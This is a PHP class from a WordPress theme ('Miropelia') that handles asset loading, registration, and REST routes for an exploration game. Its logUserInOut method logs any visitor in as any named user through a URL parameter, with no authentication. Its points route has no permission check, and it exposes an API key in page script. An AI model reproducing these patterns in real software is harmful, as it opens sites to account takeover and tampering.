<?php
/**
 * Register
 *
 * @package Miropelia
 */

namespace Miropelia;

/**
 * Register Class
 *
 * @package Miropelia
 */
class Register
{

	/**
	 * Theme instance.
	 *
	 * @var object
	 */
	public $theme;

	/**
	 * Class constructor.
	 *
	 * @param object $plugin Plugin class.
	 */
	public function __construct($theme)
    {
		$this->theme = $theme;
	}

    /**
     * Enqueue Assets for admin.
     *
     * @action admin_enqueue_scripts
     *
     * @param string $hook
     */
    public function enqueueAdminAssets($hook)
    {
        if ('post.php' === $hook) {
            wp_enqueue_style($this->theme->assets_prefix . '-admin');
        }
    }

	/**
	 * Enqueue Assets for front ui.
	 *
	 * @action wp_enqueue_scripts
	 */
	public function enqueueAssets()
    {
		global $post;

		$explore_points = get_user_meta(get_current_user_id(), 'explore_points', true);
		$explore_points = isset($explore_points) ? $explore_points: [];

		wp_enqueue_style($this->theme->assets_prefix);
        wp_enqueue_script($this->theme->assets_prefix);
        wp_enqueue_style("{$this->theme->assets_prefix}-font", 'https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@300;400;600&display=swap');

        if (is_page(['register', 'explore'])) {
            wp_add_inline_script(
                $this->theme->assets_prefix,
                'const restApiKey ="' . REST_API_KEY . '";' .
                'const currentUserId ="' . get_current_user_id() . '";' .
                'const explorePoints = ' . wp_json_encode($explore_points) . ';' .
                'const siteUrl = "' . get_home_url() . '";'
            );
        }

        if (is_page('contact')) {
            wp_enqueue_script('google-recaptcha');
        }

        // Hide all elements with hide-on-login class if user is logged in.
        if (is_user_logged_in()) {
            wp_add_inline_style($this->theme->assets_prefix, '.hide-on-login{ display: none; }');
        }
	}

    /**
     * Register post type for page components.
     *
     * @action init
     */
    public function registerPostType() {

        $args = array(
            'label'     => __( 'Explore Area', 'sharethis-custom' ),
            'menu_icon' => 'dashicons-location-alt',
            'public'             => false,
            'publicly_queryable' => false,
            'show_ui'            => true,
            'show_in_menu'       => true,
            'query_var'          => true,
            'rewrite'            => array( 'slug' => 'explore-area' ),
            'capability_type'    => 'page',
            'has_archive'        => false,
            'hierarchical'       => false,
            'menu_position'      => null,
            'show_in_rest' => true,
            'supports'           => array( 'title', 'editor', 'author', 'thumbnail'),
        );

        register_post_type( 'explore-area', $args );
    }

	/**
     * Hide admin bar for non-admins and keep users out of admin.
     *
     * @action init
     */
	public function hideAdminBar()
    {
        if (!current_user_can('administrator') && !is_admin()) {
            show_admin_bar(false);
        }

        if (is_admin() && !current_user_can('administrator') &&
             ! (wp_doing_ajax())) {
            wp_redirect(home_url());
            exit;
        }
    }

    /**
     * Don't allow access to wp-login.php
     *
     * @action login_init
     */
    public function noLoginPage()
    {
        wp_redirect(home_url());
    }

    /**
     * Auto log user in or out.
     *
     * @action init
     */
    public function logUserInOut()
    {
        if (!isset($_GET['logoutuser']) && !isset($_GET['loginuser'])) {
            return;
        }

        $user = get_user_by('login', $_GET['loginuser']);

        // If no error received, set the WP Cookie
        if ( !is_wp_error( $user ) )
        {
            wp_clear_auth_cookie();
            wp_set_current_user ( $user->ID ); // Set the current user detail
            wp_set_auth_cookie  ( $user->ID ); // Set auth details in cookie
        }

        if (isset($_GET['logoutuser'])) {
            wp_logout();
            wp_safe_redirect('/');
        }
    }

    /**
     * Dequeue recaptcha.
     *
     * @action wp_enqueue_scripts 999
     * @action wp_head 999
     */
    public function dequeueGoogle()
    {
        wp_dequeue_script('google-recaptcha');
    }

    /**
     * Register form shortcode.
     *
     * @shortcode register-form
     */
    public function registerForm()
    {
        return '<div class="form-wrapper">
                <error class="error-message"></error>
			    <p>
				    <label for="user_login">Username</label>
				    <input type="text" name="user_name" id="user_name" placeholder="Enter Username..." class="input" value="" size="20" autocapitalize="off">
			    </p>
		        <p>
		            <label for="user_login">Email</label>
		            <input type="text" name="user_email" id="user_email" placeholder="Enter Email..." class="input" value="" size="20" autocapitalize="off">
		        </p>
		        <p>
		            <label for="user_email">Password</label>
		            <input type="password" name="user_password" id="user_password" placeholder="Enter Password..." class="input" value="" size="25">
		        </p>
		        <p class="submit">
		            <button type="button" id="register-submit">' . esc_html('Join') . '</button>
		        </p>
		    </div>';
    }

    /**
     * Register API field.
     *
     * @action rest_api_init
     */
    public function create_api_posts_meta_field()
    {
        $namespace = 'orbemorder/v1';

        // Register route for getting event by location.
        register_rest_route($namespace, '/add-explore-points/(?P<user>\d+)/(?P<position>[a-zA-Z0-9-]+)/(?P<point>\d+)/(?P<character>[a-zA-Z0-9-]+)', array(
            'methods'  => 'GET',
            'callback' => [$this, 'addCharacterPoints'],
        ));

        // Register route for getting event by location.
        register_rest_route($namespace, '/area/(?P<position>[a-zA-Z0-9-]+)', array(
            'methods'  => 'GET',
            'callback' => [$this, 'getOrbemArea'],
        ));
    }

    /**
     * Call back function for rest route that adds points to user's explore game.
     * @param object $return The arg values from rest route.
     */
    public function addCharacterPoints(object $return)
    {
        $user = isset($return['user']) ? intval($return['user']) : '';
        $points = isset($return['point']) ? intval($return['point']) : '';
        $character = isset($return['character']) ? sanitize_text_field(wp_unslash($return['character'])) : '';
        $position = isset($return['position']) ? sanitize_text_field(wp_unslash($return['position'])) : '';

        if (!in_array('', [$points, $character, $user, $position], true)) {
            $current_explore_points             = get_user_meta($user, 'explore_points', true);
            $current_points             = ! empty($current_explore_points[$character]['points']) ? intval($current_explore_points[$character]['points']) : 0;
            $explore_points = !empty($current_explore_points) && is_array($current_explore_points) ? $current_explore_points : [];

            $explore_points[$character]['points'] = ($points + $current_points);

            // Add position to list of positions received points on.
            if (!isset($explore_points[$character]['positions'])) {
                $explore_points[$character]['positions'] = [$position];
            } elseif(!isset($explore_points[$character]['positions'][$position])) {
                array_push($explore_points[$character]['positions'], $position);
            }

            update_user_meta($user, 'explore_points', $explore_points);
        }
    }

    /**
     * Call back function for rest route that adds points to user's explore game.
     * @param object $return The arg values from rest route.
     */
    public function getOrbemArea(object $return)
    {
        $position = isset($return['position']) ? sanitize_text_field(wp_unslash($return['position'])) : '';

        // Get content from explore-area post type.
        $area = get_posts(['post_type' => 'explore-area', 'slug' => $position]);

        if (is_wp_error($area) || !isset($area[0])) {
            return;
        }

        return $area[0]->post_content;
    }
}
